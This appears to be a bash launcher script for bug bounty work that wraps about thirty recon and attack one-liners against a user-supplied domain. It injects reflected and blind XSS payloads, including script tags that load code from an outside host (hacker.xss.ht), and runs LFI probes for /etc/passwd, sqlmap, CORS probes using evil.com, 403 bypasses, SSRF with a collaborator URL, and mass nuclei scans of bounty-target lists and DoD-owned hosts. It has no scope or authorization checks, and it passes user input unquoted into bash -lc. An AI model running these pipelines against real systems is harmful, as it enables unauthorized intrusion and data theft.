#!/bin/bash

set -o pipefail

# Bug Bounty Oneliner Mega Menu
# A curated launcher for common oneliners grouped by category
# Results are stored under ./results/<timestamp>_<target>

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RESULTS_DIR="$SCRIPT_DIR/results"
mkdir -p "$RESULTS_DIR"

COLOR_RESET='\033[0m'
COLOR_GREEN='\033[0;32m'
COLOR_YELLOW='\033[1;33m'
COLOR_BLUE='\033[1;34m'
COLOR_RED='\033[0;31m'

banner() {
  echo -e "${COLOR_BLUE}============================================================${COLOR_RESET}"
  echo -e "${COLOR_GREEN} Bug Bounty Framework - Oneliner Launcher${COLOR_RESET}"
  echo -e "${COLOR_BLUE}============================================================${COLOR_RESET}"
}

prompt_target() {
  if [ -z "$TARGET" ]; then
    read -rp "Target domain (e.g., example.com): " TARGET
  fi
  if [ -z "$TARGET" ]; then echo "Target required"; return 1; fi
  if [ -z "$OUTPUT_DIR" ]; then
    OUTPUT_DIR="$RESULTS_DIR/$(date +%Y%m%d_%H%M%S)_$TARGET"
  fi
  mkdir -p "$OUTPUT_DIR"
  echo "Output -> $OUTPUT_DIR"
}

ensure_tool() {
  if ! command -v "$1" >/dev/null 2>&1; then
    echo -e "${COLOR_RED}Missing dependency: $1${COLOR_RESET}"
    return 1
  fi
}

run_or_skip() {
  CMD="$1"
  DESC="$2"
  echo -e "${COLOR_YELLOW}>> ${DESC}${COLOR_RESET}"
  bash -lc "$CMD"
}

# Deduplicate a file in-place (if it exists)
dedupe_file() {
  local file="$1"
  [ -f "$file" ] && sort -u "$file" -o "$file" 2>/dev/null || true
}

# ===== Categories =====

cat_subdomain_pd() {
  prompt_target || return
  ensure_tool subfinder || return
  ensure_tool httpx || return
  run_or_skip "subfinder -d '$TARGET' -all -silent | sort -u | tee -a '$OUTPUT_DIR/subdomains.txt'" "Subfinder"
  dedupe_file "$OUTPUT_DIR/subdomains.txt"
  run_or_skip "httpx -l '$OUTPUT_DIR/subdomains.txt' -silent | sort -u | tee '$OUTPUT_DIR/live_subdomains.txt'" "Probing with httpx"
}

cat_gospider_subdomain() {
  prompt_target || return
  ensure_tool gospider || return
  run_or_skip "gospider -d 0 -s 'https://$TARGET' -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/\"]+' | sort -u | tee '$OUTPUT_DIR/gospider_hosts.txt'" "Gospider host discovery"
  dedupe_file "$OUTPUT_DIR/gospider_hosts.txt"
}

cat_git_head_from_crt() {
  prompt_target || return
  ensure_tool curl || return
  ensure_tool jq || return
  ensure_tool assetfinder || return
  ensure_tool httpx || return
  run_or_skip "curl -s 'https://crt.sh/?q=%25.$TARGET&output=json' | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | tee '$OUTPUT_DIR/git_head_candidates.txt'" ".git/HEAD candidates via crt.sh"
}

cat_git_head_from_domains_list() {
  ensure_tool wget || return
  ensure_tool httpx || return
  OUTDIR="$RESULTS_DIR/domains_githead_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$OUTDIR"
  run_or_skip "wget -q https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -O '$OUTDIR/domains.txt' && sed 's#$#/.git/HEAD#g' '$OUTDIR/domains.txt' | httpx -silent -content-length -status-code -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | tee '$OUTDIR/git_head_results.txt'" ".git/HEAD across bounty targets"
  echo "Results -> $OUTDIR"
}

cat_xss_urls_seed() {
  read -rp "Seed URL (e.g., https://example.com/): " SEED
  [ -z "$SEED" ] && echo "Seed required" && return
  ensure_tool katana || return
  ensure_tool cariddi || return
  ensure_tool dalfox || return
  OUTFILE="$RESULTS_DIR/xss_seed_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "katana -u '$SEED' | cariddi | dalfox pipe | tee -a '$OUTFILE'" "XSS+URLs from seed"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

cat_xss_filter_and_payload() {
  read -rp "Input URLs file: " INFILE
  [ ! -f "$INFILE" ] && echo "File not found" && return
  ensure_tool qsreplace || return
  OUTFILE="$RESULTS_DIR/xss_grep_qs_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "egrep -iv '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)$' '$INFILE' | grep '=' | qsreplace '\"\"><script>alert(1)</script>' | tee '$OUTFILE'" "Filter URLs and inject XSS payload"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

cat_xss_gospider_single() {
  read -rp "Target URL (e.g., https://www.target.com/): " URL
  [ -z "$URL" ] && echo "URL required" && return
  ensure_tool gospider || return
  ensure_tool dalfox || return
  ensure_tool qsreplace || return
  OUTFILE="$RESULTS_DIR/xss_dalfox_single_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "gospider -s '$URL' -c 10 -d 5 --blacklist '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)$' --other-source | grep -e 'code-200' | awk '{print $5}' | grep '=' | qsreplace -a | dalfox pipe -o '$OUTFILE'" "Dalfox XSS (single)"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

cat_xss_gospider_multiple() {
  read -rp "Input URLs file: " INFILE
  [ ! -f "$INFILE" ] && echo "File not found" && return
  ensure_tool gospider || return
  ensure_tool dalfox || return
  ensure_tool qsreplace || return
  OUTFILE="$RESULTS_DIR/xss_dalfox_multi_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "gospider -S '$INFILE' -c 10 -d 5 --blacklist '.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)$' --other-source | grep -e 'code-200' | awk '{print $5}' | grep '=' | qsreplace -a | dalfox pipe -o '$OUTFILE'" "Dalfox XSS (multiple)"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

cat_kxss_wayback() {
  ensure_tool waybackurls || return
  ensure_tool kxss || return
  read -rp "Host (e.g., testphp.vulnweb.com): " HOST
  [ -z "$HOST" ] && echo "Host required" && return
  OUTFILE="$RESULTS_DIR/kxss_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "echo '$HOST' | waybackurls | kxss | tee '$OUTFILE'" "KXSS param reflection"
  dedupe_file "$OUTFILE"
}

cat_bxss_params() {
  ensure_tool subfinder || return
  ensure_tool gau || return
  ensure_tool bxss || return
  read -rp "Domain (for subfinder): " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  run_or_skip "subfinder -d '$DOMAIN' -silent | gau | grep '&' | bxss -appendMode -payload '\"\"><script src=https://hacker.xss.ht></script>' -parameters" "BXSS in parameters"
}

cat_bxss_header() {
  ensure_tool subfinder || return
  ensure_tool gau || return
  ensure_tool bxss || return
  read -rp "Domain (for subfinder): " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  run_or_skip "subfinder -d '$DOMAIN' -silent | gau | bxss -payload '\"\"><script src=https://hacker.xss.ht></script>' -header 'X-Forwarded-For'" "BXSS in X-Forwarded-For"
}

cat_gxss_single() {
  ensure_tool waybackurls || return
  ensure_tool httpx || return
  ensure_tool Gxss || return
  ensure_tool dalfox || return
  read -rp "Host (e.g., testphp.vulnweb.com): " HOST
  [ -z "$HOST" ] && echo "Host required" && return
  run_or_skip "echo '$HOST' | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep 'URL' | awk -F'\"' '{print $2}' | sort -u | dalfox pipe" "Gxss + Dalfox"
}

cat_xss_without_gf() {
  ensure_tool waybackurls || return
  read -rp "Host (e.g., testphp.vulnweb.com): " HOST
  [ -z "$HOST" ] && echo "Host required" && return
  run_or_skip "waybackurls '$HOST' | grep '=' | qsreplace '\"\"><script>alert(1)</script>' | while read -r h; do curl -s --path-as-is --insecure \"\$h\" | grep -qs '<script>alert(1)</script>' && echo \"\$h Vulnerable\"; done" "Simple reflected XSS check"
}

cat_cors_check() {
  read -rp "Site (with scheme, e.g., https://example.com): " SITE
  [ -z "$SITE" ] && echo "Site required" && return
  ensure_tool gau || return
  OUTFILE="$RESULTS_DIR/cors_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "gau '$SITE' | while read -r url; do target=$(curl -s -I -H 'Origin: https://evil.com' -X GET \"$url\"); echo \"$target\" | grep -q 'https://evil.com' && echo \"[Potential CORS] $url\"; done | tee '$OUTFILE'" "CORS misconfiguration scan"
}

cat_sqli_quick() {
  read -rp "Domain (for findomain): " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  ensure_tool findomain || return
  ensure_tool httpx || return
  ensure_tool waybackurls || return
  ensure_tool gf || return
  ensure_tool sqlmap || return
  OUTFILE="$RESULTS_DIR/sqli_candidates_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "findomain -t '$DOMAIN' -q | httpx -silent | waybackurls | gf sqli | tee '$OUTFILE' && sqlmap -m '$OUTFILE' --batch --random-agent --level 1" "SQLi quick pipeline"
}

cat_lfi_check() {
  read -rp "Domain: " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  ensure_tool gau || return
  ensure_tool gf || return
  ensure_tool qsreplace || return
  OUTFILE="$RESULTS_DIR/lfi_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "gau '$DOMAIN' | gf lfi | qsreplace '/etc/passwd' | xargs -I% -P 10 sh -c 'curl -s \"%\" 2>&1 | grep -q \"root:x\" && echo \"VULN! %\"' | tee '$OUTFILE'" "LFI quick check"
}

cat_open_redirect() {
  read -rp "Domain: " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  ensure_tool gau || return
  ensure_tool gf || return
  ensure_tool qsreplace || return
  run_or_skip "export LHOST='http://localhost'; gau '$DOMAIN' | gf redirect | qsreplace \"$LHOST\" | xargs -I % -P 10 sh -c 'curl -Is \"%\" 2>&1 | grep -q \"Location: $LHOST\" && echo \"VULN! %\"'" "Open redirect probe"
}

cat_directory_listing_ferox() {
  read -rp "URL (with scheme): " URL
  [ -z "$URL" ] && echo "URL required" && return
  ensure_tool feroxbuster || return
  run_or_skip "feroxbuster -u '$URL' --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt" "Feroxbuster common"
}

cat_js_find() {
  read -rp "Domain: " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  ensure_tool gau || return
  OUTFILE="$RESULTS_DIR/js_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "gau -subs '$DOMAIN' | grep -iE '\\.js' | grep -iEv '(\\.jsp|\\.json)$' | sort -u | tee '$OUTFILE'" "Find JS files"
}

cat_uncover_queries() {
  ensure_tool uncover || return
  echo "1) http.title: GitLab -> httpx -> nuclei"
  echo "2) raw target query as IP -> naabu"
  echo "3) org DoD -> httpx -> nuclei"
  read -rp "Select: " UQ
  case "$UQ" in
    1) run_or_skip "uncover -q 'http.title:\"GitLab\"' -silent | httpx -silent | nuclei -silent" "Uncover GitLab";;
    2) read -rp "Query: " Q; run_or_skip "uncover -q '$Q' -f ip | naabu" "Uncover -> naabu";;
    3) run_or_skip "uncover -q 'org:\"DoD Network Information Center\"' | httpx -silent | nuclei -silent -severity low,medium,high,critical" "Uncover DoD";;
    *) echo "skip";;
  esac
}

cat_admin_login() {
  read -rp "Domains list file: " INFILE
  [ ! -f "$INFILE" ] && echo "File not found" && return
  ensure_tool httpx || return
  run_or_skip "cat '$INFILE' | httpx -ports 80,443,8080,8443 -path /admin -mr 'admin'" "Admin login check"
}

cat_403_bypass_login() {
  read -rp "Hosts file: " INFILE
  [ ! -f "$INFILE" ] && echo "File not found" && return
  ensure_tool httpx || return
  run_or_skip "cat '$INFILE' | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent" "403 bypass for login"
}

cat_recon_params_cariddi() {
  read -rp "Domain: " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  ensure_tool subfinder || return
  ensure_tool httpx || return
  ensure_tool cariddi || return
  run_or_skip "echo '$DOMAIN' | subfinder -silent | httpx -silent | cariddi -intensive" "Recon parameters (cariddi)"
}

# Additional oneliners from user list
cat_xss_hakrawler_pipeline() {
  read -rp "Target URL (e.g., https://target.com): " URL
  [ -z "$URL" ] && echo "URL required" && return
  ensure_tool hakrawler || return
  ensure_tool qsreplace || return
  ensure_tool dalfox || return
  OUTFILE="$RESULTS_DIR/xss_hakrawler_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "hakrawler -url '$URL' -plain -usewayback | grep '=' | egrep -iv '\\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)$' | qsreplace -a | dalfox pipe | tee '$OUTFILE'" "Hakrawler -> Dalfox XSS"
  echo "Saved -> $OUTFILE"
}

cat_xss_gf_single() {
  read -rp "URL or Host (e.g., http://testphp.vulnweb.com/): " URL
  [ -z "$URL" ] && echo "Input required" && return
  ensure_tool waybackurls || return
  ensure_tool httpx || return
  ensure_tool gf || return
  OUTFILE="$RESULTS_DIR/xss_gf_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "echo '$URL' | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | sort -u | tee '$OUTFILE'" "GF XSS candidates"
  dedupe_file "$OUTFILE"
}

cat_xss_gf_dalfox_file() {
  read -rp "Input URLs file: " INFILE
  [ ! -f "$INFILE" ] && echo "File not found" && return
  ensure_tool gf || return
  ensure_tool dalfox || return
  TMPFILE="$RESULTS_DIR/testxss_$(date +%Y%m%d_%H%M%S).txt"
  OUTFILE="$RESULTS_DIR/dalfox_xss_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "cat '$INFILE' | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee '$TMPFILE' && dalfox file '$TMPFILE' -o '$OUTFILE'" "Dalfox from GF list"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

cat_bounty_targets_jaeles() {
  ensure_tool wget || return
  ensure_tool httpx || return
  ensure_tool jaeles || return
  OUTDIR="$RESULTS_DIR/jaeles_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$OUTDIR"
  run_or_skip "wget -q https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -O '$OUTDIR/domains.txt' && cat '$OUTDIR/domains.txt' | httpx -silent | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @ | tee '$OUTDIR/jaeles.txt'" "Jaeles on bounty targets"
  echo "Results -> $OUTDIR"
  dedupe_file "$OUTDIR/jaeles.txt"
}

cat_bounty_targets_nuclei() {
  ensure_tool wget || return
  ensure_tool httpx || return
  ensure_tool nuclei || return
  OUTDIR="$RESULTS_DIR/nuclei_$(date +%Y%m%d_%H%M%S)"
  mkdir -p "$OUTDIR"
  run_or_skip "wget -q https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -O '$OUTDIR/domains.txt' && cat '$OUTDIR/domains.txt' | httpx -silent | nuclei -t ~/nuclei-templates/ -o '$OUTDIR/result.txt'" "Nuclei on bounty targets"
  echo "Results -> $OUTDIR"
  dedupe_file "$OUTDIR/result.txt"
}

cat_ssrf_recon_qsreplace() {
  read -rp "Domain: " DOMAIN
  [ -z "$DOMAIN" ] && echo "Domain required" && return
  read -rp "Collaborator URL (e.g., http://abc.oastify.com): " COLLAB
  [ -z "$COLLAB" ] && echo "Collaborator required" && return
  ensure_tool findomain || return
  ensure_tool httpx || return
  ensure_tool gau || return
  ensure_tool qsreplace || return
  OUTFILE="$RESULTS_DIR/ssrf_$(date +%Y%m%d_%H%M%S).txt"
  run_or_skip "findomain -t '$DOMAIN' -q | httpx -silent -threads 1000 | gau | grep '=' | qsreplace '$COLLAB' | tee '$OUTFILE'" "SSRF candidates with collaborator"
  echo "Saved -> $OUTFILE"
  dedupe_file "$OUTFILE"
}

# Smart auto-scan pipeline: domain -> subs -> resolve -> probe -> urls -> params -> scan
cat_auto_smart_scan() {
  prompt_target || return
  echo -e "${COLOR_GREEN}Starting smart pipeline for $TARGET${COLOR_RESET}"
  ensure_tool subfinder || return
  ensure_tool httpx || return
  # Optional tools used if present
  HAVE_DNSX=0; command -v dnsx >/dev/null 2>&1 && HAVE_DNSX=1
  HAVE_GAU=0; command -v gau >/dev/null 2>&1 && HAVE_GAU=1
  HAVE_WAYBACK=0; command -v waybackurls >/dev/null 2>&1 && HAVE_WAYBACK=1
  HAVE_KATANA=0; command -v katana >/dev/null 2>&1 && HAVE_KATANA=1
  HAVE_NUCLEI=0; command -v nuclei >/dev/null 2>&1 && HAVE_NUCLEI=1
  HAVE_DALFOX=0; command -v dalfox >/dev/null 2>&1 && HAVE_DALFOX=1

  run_or_skip "subfinder -d '$TARGET' -all -silent | sort -u | tee -a '$OUTPUT_DIR/subdomains.txt'" "Subfinder"
  dedupe_file "$OUTPUT_DIR/subdomains.txt"

  if [ $HAVE_DNSX -eq 1 ]; then
    run_or_skip "dnsx -l '$OUTPUT_DIR/subdomains.txt' -silent | awk '{print $1}' | sort -u | tee '$OUTPUT_DIR/resolved.txt'" "Resolving with dnsx"
  fi

  INPUT_FOR_HTTPX="$OUTPUT_DIR/subdomains.txt"; [ -s "$OUTPUT_DIR/resolved.txt" ] && INPUT_FOR_HTTPX="$OUTPUT_DIR/resolved.txt"
  run_or_skip "httpx -l '$INPUT_FOR_HTTPX' -silent -tech-detect -status-code -content-length | tee '$OUTPUT_DIR/live_subdomains_detailed.txt'" "Probing live hosts"
  run_or_skip "cut -d ' ' -f1 '$OUTPUT_DIR/live_subdomains_detailed.txt' | sort -u | tee '$OUTPUT_DIR/live_subdomains.txt'" "Extract live host list"

  # URLs discovery
  : > "$OUTPUT_DIR/all_urls.txt"
  if [ $HAVE_GAU -eq 1 ]; then
    run_or_skip "cat '$OUTPUT_DIR/live_subdomains.txt' | gau | tee -a '$OUTPUT_DIR/all_urls.txt' >/dev/null" "gau URLs"
  fi
  if [ $HAVE_WAYBACK -eq 1 ]; then
    run_or_skip "cat '$OUTPUT_DIR/live_subdomains.txt' | waybackurls | tee -a '$OUTPUT_DIR/all_urls.txt' >/dev/null" "waybackurls"
  fi
  if [ $HAVE_KATANA -eq 1 ]; then
    run_or_skip "katana -list '$OUTPUT_DIR/live_subdomains.txt' -silent -nc -kf all -ef woff,css,png,svg,jpg,woff2,jpeg,gif -xhr | tee -a '$OUTPUT_DIR/all_urls.txt' >/dev/null" "katana crawl"
  fi
  dedupe_file "$OUTPUT_DIR/all_urls.txt"

  # Live URLs
  if [ -s "$OUTPUT_DIR/all_urls.txt" ]; then
    run_or_skip "httpx -l '$OUTPUT_DIR/all_urls.txt' -silent -mc 200,301,302,403 | tee '$OUTPUT_DIR/live_urls.txt'" "Filter live URLs"
  fi

  # Params
  run_or_skip "grep -E '\\?' '$OUTPUT_DIR/live_urls.txt' | sort -u | tee '$OUTPUT_DIR/urls_with_params.txt' >/dev/null" "Extract parameterized URLs"

  # Nuclei and Dalfox (subset for speed)
  if [ $HAVE_NUCLEI -eq 1 ]; then
    run_or_skip "nuclei -l '$OUTPUT_DIR/live_subdomains.txt' -severity critical,high,medium -silent | tee '$OUTPUT_DIR/vulnerabilities.txt'" "Nuclei scan"
  fi
  if [ $HAVE_DALFOX -eq 1 ] && [ -s "$OUTPUT_DIR/urls_with_params.txt" ]; then
    run_or_skip "head -200 '$OUTPUT_DIR/urls_with_params.txt' | dalfox pipe -o '$OUTPUT_DIR/xss_results.txt'" "Dalfox XSS quick"
  fi

  echo -e "${COLOR_GREEN}Smart pipeline finished. Output -> $OUTPUT_DIR${COLOR_RESET}"
}

show_menu() {
  clear
  banner
  echo "Select a category/action:"
  echo "  1) Subdomains (ProjectDiscovery)"
  echo "  2) Subdomains via Gospider"
  echo "  3) .git/HEAD via crt.sh"
  echo "  4) .git/HEAD across bounty targets"
  echo "  5) XSS + URLs from a seed"
  echo "  6) XSS: filter file and inject payload"
  echo "  7) XSS: Gospider single target -> Dalfox"
  echo "  8) XSS: Gospider multiple targets -> Dalfox"
  echo "  9) XSS: KXSS via Wayback"
  echo " 10) BXSS: parameters"
  echo " 11) BXSS: header (X-Forwarded-For)"
  echo " 12) XSS: Gxss + Dalfox"
  echo " 13) XSS without gf (simple reflected)"
  echo " 14) CORS misconfiguration"
  echo " 15) SQLi quick pipeline"
  echo " 16) LFI quick check"
  echo " 17) Open Redirect check"
  echo " 18) Directory discovery (Feroxbuster)"
  echo " 19) Find JS files"
  echo " 20) Uncover queries"
  echo " 21) Find admin login"
  echo " 22) 403 login bypass"
  echo " 23) Recon parameters (cariddi)"
  echo " 24) Auto smart scan (domain -> results)"
  echo " 25) XSS: Hakrawler -> Dalfox pipeline"
  echo " 26) XSS: GF single host candidates"
  echo " 27) XSS: Dalfox from GF file"
  echo " 28) Bounty targets -> Jaeles"
  echo " 29) Bounty targets -> Nuclei"
  echo " 30) SSRF recon with qsreplace"
  echo "  q) Quit"
}

main() {
  while true; do
    show_menu
    read -rp "Choice: " CH
    case "$CH" in
      1) cat_subdomain_pd;;
      2) cat_gospider_subdomain;;
      3) cat_git_head_from_crt;;
      4) cat_git_head_from_domains_list;;
      5) cat_xss_urls_seed;;
      6) cat_xss_filter_and_payload;;
      7) cat_xss_gospider_single;;
      8) cat_xss_gospider_multiple;;
      9) cat_kxss_wayback;;
      10) cat_bxss_params;;
      11) cat_bxss_header;;
      12) cat_gxss_single;;
      13) cat_xss_without_gf;;
      14) cat_cors_check;;
      15) cat_sqli_quick;;
      16) cat_lfi_check;;
      17) cat_open_redirect;;
      18) cat_directory_listing_ferox;;
      19) cat_js_find;;
      20) cat_uncover_queries;;
      21) cat_admin_login;;
      22) cat_403_bypass_login;;
      23) cat_recon_params_cariddi;;
      24) cat_auto_smart_scan;;
      25) cat_xss_hakrawler_pipeline;;
      26) cat_xss_gf_single;;
      27) cat_xss_gf_dalfox_file;;
      28) cat_bounty_targets_jaeles;;
      29) cat_bounty_targets_nuclei;;
      30) cat_ssrf_recon_qsreplace;;
      q|Q) echo "Bye"; exit 0;;
      *) echo "Invalid";;
    esac
    echo
    read -rp "Press Enter to continue..." _
  done
}

main "$@"
